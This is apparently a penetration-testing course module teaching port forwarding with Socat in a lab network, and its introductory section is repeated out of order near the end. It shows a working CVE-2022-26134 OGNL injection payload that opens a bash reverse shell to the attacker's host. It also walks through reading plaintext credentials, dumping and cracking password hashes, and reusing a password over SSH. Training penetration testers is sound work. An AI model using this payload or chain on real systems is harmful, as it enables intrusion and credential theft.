In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

